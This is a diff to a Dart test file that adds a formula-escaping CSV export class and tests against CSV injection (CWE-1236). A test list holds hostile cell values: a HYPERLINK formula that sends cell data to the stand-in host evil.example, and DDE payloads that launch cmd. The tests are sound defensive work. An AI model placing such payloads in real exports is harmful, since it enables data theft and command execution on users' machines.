@@ -87,6 +87,15 @@ final class ListExport implements FromCollection, WithHeadings {
   List<Object?> headings() => heads;
 }
 
+/// [ListExport] with `CsvSettings(escapeFormulas: true)`.
+final class EscapedListExport extends ListExport
+    implements WithCustomCsvSettings {
+  EscapedListExport(super.rows, [super.heads]);
+
+  @override
+  CsvSettings getCsvSettings() => const CsvSettings(escapeFormulas: true);
+}
+
 final class TwoSheets implements WithMultipleSheets {
   @override
   List<Object> sheets() => [
@@ -325,6 +334,68 @@ void main() {
         utf8.decode(bytes),
         '"x","y"\n"a ""q""","line\nbreak","2","TRUE","","2026-01-02"\n',
       );
+    });
+
+    group('escapeFormulas (CWE-1236)', () {
+      const hostile = [
+        '=HYPERLINK("http://evil.example/?d="&A1,"open")',
+        "=cmd|' /C calc'!A0",
+        '+1+cmd|x',
+        '-2+3+cmd|x',
+        '@SUM(1+1)*cmd|x',
+        '\t=1+1',
+        '\r=1+1',
+      ];
+
+      test('text a spreadsheet would run gets a leading quote', () async {
+        final bytes = await Excel.raw(
+          EscapedListExport([
+            for (final text in hostile) [text],
+          ]),
+          ExcelType.csv,
+        );
+        final rows = await parseCsv(
+          Stream.value(bytes),
+          const CsvSettings(),
+        ).toList();
+        expect(
+          [for (final row in rows) row.single],
+          [for (final text in hostile) "'$text"],
+        );
+      });
+
+      test('numbers, dates, booleans and plain text are unchanged', () async {
+        final bytes = await Excel.raw(
+          EscapedListExport([
+            [-5, 2.5, '-5', '+6281234567', '1.5e3', 'Ana', 'a=b', true],
+            [DateTime.utc(2026, 1, 2), null, '', '- item', 'x@y.z', '=', 0],
+          ]),
+          ExcelType.csv,
+        );
+        expect(
+          utf8.decode(bytes),
+          '"-5","2.5","-5","+6281234567","1.5e3","Ana","a=b","TRUE"\n'
+          '"2026-01-02","","","\'- item","x@y.z","\'=","0"\n',
+        );
+      });
+
+      test('off by default, as in Laravel Excel', () async {
+        final bytes = await Excel.raw(
+          ListExport([
+            ['=1+1', '@x'],
+          ]),
+          ExcelType.csv,
+        );
+        expect(utf8.decode(bytes), '"=1+1","@x"\n');
+      });
+
+      test('escapeCsvFormula on its own', () {
+        expect(escapeCsvFormula('=1+1'), "'=1+1");
+        expect(escapeCsvFormula('-12.5'), '-12.5');
+        expect(escapeCsvFormula('-'), "'-");
+        expect(escapeCsvFormula(''), '');
+        expect(escapeCsvFormula('Budi'), 'Budi');
+      });
     });
 
     test('reading: quotes, CRLF, BOM, detected delimiters, numbers', () async {
